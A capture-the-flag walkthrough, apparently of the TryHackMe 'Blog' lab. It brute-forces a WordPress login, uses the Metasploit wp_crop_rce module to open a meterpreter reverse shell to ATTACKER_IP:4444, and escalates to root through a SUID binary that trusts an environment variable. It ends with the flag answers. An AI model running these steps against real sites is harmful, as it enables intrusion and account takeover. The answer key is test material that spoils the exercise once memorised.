# Blog

*Billy Joel made a Wordpress blog!*

--------------------------------------------------

## Walkthrough

I had to change `/etc/hosts` to include:

```
blog.thm    VICTIM_IP
```

Initial `nmap` scan:

```
$ nmap -sC -sV -p- -T4 VICTIM_IP
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-11 19:54 GMT
Nmap scan report for VICTIM_IP
Host is up (0.045s latency).
Not shown: 65531 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.0
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2022-01-11T19:54:54+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-01-11T19:54:54
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.90 seconds
```

So to summarise, there are **four** open ports:

- Port 22 (SSH)
- Port 80 (HTTP)
- Port 139 and 145 (SMB) 

Navigating to `http://blog.thm`, it is clear that the website is running Wordpress as its **CMS** or **C**ontent **M**anagement **S**ystem.

To enumerate this further, I used `wpscan`:

```
$ wpscan --url http://blog.thm
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.18
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://blog.thm/ [VICTIM_IP]
[+] Started: Tue Jan 11 19:59:19 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://blog.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blog.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blog.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blog.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.thm/feed/, <generator>https://wordpress.org/?v=5.0</generator>
 |  - http://blog.thm/comments/feed/, <generator>https://wordpress.org/?v=5.0</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://blog.thm/wp-content/themes/twentytwenty/
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://blog.thm/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 1.8
 | Style URL: http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:02 <===================================> (137 / 137) 100.00% Time: 00:00:02

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Jan 11 19:59:26 2022
[+] Requests Done: 139
[+] Cached Requests: 38
[+] Data Sent: 33.453 KB
[+] Data Received: 59.302 KB
[+] Memory used: 236.609 MB
[+] Elapsed time: 00:00:07
```

I also conducted some manual emumeration and found two usernames: `kwheel` and `bjoel`.  I then decided to try and bruteforce the password for each user:

```
$ wpscan --url http://blog.thm/ --usernames kwheel --passwords /usr/share/wordlists/rockyou.txt
...
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - kwheel / cutiepie1                                                                                    
Trying kwheel / westham Time: 00:01:33 <                                 > (2865 / 14347257)  0.01%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: kwheel, Password: cutiepie1

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Jan 11 21:41:47 2022
[+] Requests Done: 3037
[+] Cached Requests: 7
[+] Data Sent: 1.469 MB
[+] Data Received: 2.006 MB
[+] Memory used: 273.57 MB
[+] Elapsed time: 00:01:43
```

This version of WordPress is vulnerable to the following [exploit](https://www.exploit-db.com/exploits/49512).  I used the `wp_crop_rce` Metasploit module to exploit the website:

```
$ msfconsole
...
msf6 > use exploit/multi/http/wp_crop_rce
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/wp_crop_rce) > options

Module options (exploit/multi/http/wp_crop_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/
                                         wiki/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   USERNAME                    yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  ATTACKER_IP     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress

msf6 exploit(multi/http/wp_crop_rce) > set RHOST blog.thm
RHOST => blog.thm
msf6 exploit(multi/http/wp_crop_rce) > set USERNAME kwheel
USERNAME => kwheel
msf6 exploit(multi/http/wp_crop_rce) > set PASSWORD cutiepie1
PASSWORD => cutiepie1
msf6 exploit(multi/http/wp_crop_rce) > exploit

[*] Started reverse TCP handler on ATTACKER_IP:4444 
[*] Authenticating with WordPress using kwheel:cutiepie1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (39282 bytes) to VICTIM_IP
[*] Attempting to clean up files...
[*] Meterpreter session 1 opened (ATTACKER_IP:4444 -> VICTIM_IP:43446 ) at 2022-01-12 21:11:43 +0000

meterpreter > 
```

Then, get a shell from `meterpreter`:

```
meterpreter > shell
Process 1500 created.
Channel 1 created.
SHELL=/bin/bash script -q /dev/null
www-data@blog:/var/www/wordpress$ 
```

Checking what files are owned by the `root` user:

```
www-data@blog:/var/www/wordpress$ find / -type f -user root -perm -u=s 2>/dev/null
llnd / -type f -user root -perm -u=s 2>/dev/nul
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/newgidmap
/usr/bin/traceroute6.iputils
/usr/sbin/checker
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/bin/mount
/bin/fusermount
/bin/umount
/bin/ping
/bin/su
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9066/bin/mount
/snap/core/9066/bin/ping
/snap/core/9066/bin/ping6
/snap/core/9066/bin/su
/snap/core/9066/bin/umount
/snap/core/9066/usr/bin/chfn
/snap/core/9066/usr/bin/chsh
/snap/core/9066/usr/bin/gpasswd
/snap/core/9066/usr/bin/newgrp
/snap/core/9066/usr/bin/passwd
/snap/core/9066/usr/bin/sudo
/snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9066/usr/lib/openssh/ssh-keysign
/snap/core/9066/usr/lib/snapd/snap-confine
/snap/core/9066/usr/sbin/pppd
```

`/usr/sbin/checker` looks suspicious.  The file appears to be a 64-bit ELF.  Running this file outputs:

```
www-data@blog:/$ /usr/sbin/checker
/usr/sbin/checker
Not an Admin
```

Running the executable with `ltrace` reveals that it checks for an environment variable called `admin`.  I created this variable, set it to `1`, and then ran the executable again:

```
www-data@blog:/$ export admin=1
export admin=1
www-data@blog:/$ /usr/sbin/checker
/usr/sbin/checker
root@blog:/# 
```

I then found the `root.txt` flag:

```
root@blog:/# cd /root
cd /root
root@blog:/root# ls -la 
ls -la
total 60
drwx------  6 root root  4096 May 28  2020 .
drwxr-xr-x 24 root root  4096 May 25  2020 ..
lrwxrwxrwx  1 root root     9 May 26  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root  3106 Apr  9  2018 .bashrc
drwx------  2 root root  4096 May 26  2020 .cache
drwx------  3 root root  4096 May 26  2020 .gnupg
drwxr-xr-x  3 root root  4096 May 26  2020 .local
-rw-------  1 root root   272 May 28  2020 .mysql_history
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
drwx------  2 root root  4096 May 25  2020 .ssh
-rw-------  1 root root 13291 May 28  2020 .viminfo
-rw-r--r--  1 root root   215 May 27  2020 .wget-hsts
-rw-r--r--  1 root root    33 May 26  2020 root.txt
root@blog:/root# cat root.txt
cat root.txt
9a0b2b618bef9bfa7ac28c1353d9f318
```

Going to `/home/bjoel` reveals a `user.txt`:

```
root@blog:/# cd /home
cd /home
root@blog:/home# ls -l
ls -l
total 4
drwxr-xr-x 4 bjoel bjoel 4096 May 26  2020 bjoel
root@blog:/home# cd bjoel
cd bjoel
root@blog:/home/bjoel# ls -l
ls -l
total 72
-rw-r--r-- 1 bjoel bjoel 69106 May 26  2020 Billy_Joel_Termination_May20-2020.pdf
-rw-r--r-- 1 bjoel bjoel    57 May 26  2020 user.txt
root@blog:/home/bjoel# cat user.txt
cat user.txt
You won't find what you're looking for here.

TRY HARDER
```

Using the same technique as before:

```
root@blog:/# find / -type f -name user.txt 2>/dev/null
find / -type f -name user.txt 2>/dev/null
/home/bjoel/user.txt
/media/usb/user.txt
root@blog:/# cat /media/usb/user.txt
cat /media/usb/user.txt
c8421899aae571f7af486492b71a8ab7
```

--------------------------------------------------

## Answers

1. `root.txt`

```
9a0b2b618bef9bfa7ac28c1353d9f318
```

2. `user.txt`

```
c8421899aae571f7af486492b71a8ab7
```

3. Where was `user.txt` found?

```
/media/usb
```

4. What CMS was Billy using?

```
WordPress
```

5. What version of the above CMS was being used?

```
5.0
```

